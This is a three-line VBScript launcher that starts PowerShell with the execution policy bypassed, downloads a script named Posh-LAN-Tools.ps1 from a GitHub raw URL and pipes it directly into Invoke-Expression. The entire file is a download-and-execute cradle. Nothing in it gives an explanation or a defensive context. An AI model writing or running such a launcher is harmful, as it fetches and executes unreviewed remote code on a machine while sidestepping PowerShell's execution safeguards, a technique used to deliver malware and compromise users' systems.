Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -Ep Bypass -C $stage = 'y'; irm https://raw.githubusercontent.com/beigew0rm/Posh-LAN/main/Posh-LAN-Tools.ps1 | iex"
